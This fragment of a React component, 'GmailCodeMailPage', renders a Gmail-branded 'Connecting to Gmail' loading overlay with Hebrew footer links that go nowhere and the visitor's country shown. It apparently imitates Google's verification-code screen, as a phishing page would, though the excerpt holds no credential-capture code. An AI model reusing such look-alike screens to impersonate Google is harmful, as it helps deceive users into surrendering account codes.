                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 16,
                }}
              >
                <img
                  src={gmailLogo}
                  alt="Connecting to Gmail"
                  style={{ width: 80, height: 80 }}
                />
                <div
                  style={{
                    width: 24,
                    height: 24,
                    border: "3px solid #1a73e8",
                    borderTop: "3px solid transparent",
                    borderRadius: "50%",
                    animation: "spin 1s linear infinite",
                  }}
                />
                <p
                  style={{
                    color: "#5f6368",
                    fontSize: 14,
                    margin: 0,
                    textAlign: "center",
                  }}
                >
                  {phrases[phraseIndex]}
                </p>
              </div>
              {/* Footer inside overlay */}
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  minHeight: 44,
                  borderTop: "1px solid #f0f0f0",
                  background: "transparent",
                  padding: "0 24px",
                  position: "absolute",
                  bottom: 0,
                  left: 0,
                }}
              >
                <div style={{ display: "flex", gap: 40 }}>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    עזרה
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    פרטיות
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    תנאים
                  </a>
                </div>
                <span style={{ color: "#666", fontSize: 12 }}>
                  {country?.name || "..."}
                </span>
              </div>
            </div>
          )}

          <style>{`
          @keyframes loadingBar { 0% { transform: translateX(-100%);} 50% { transform: translateX(0%);} 100% { transform: translateX(100%);} }
          @keyframes spin { from { transform: rotate(0deg);} to { transform: rotate(360deg);} }
        `}</style>
        </div>
      </div>
    </EmailLayout>
  );
};

export default GmailCodeMailPage;
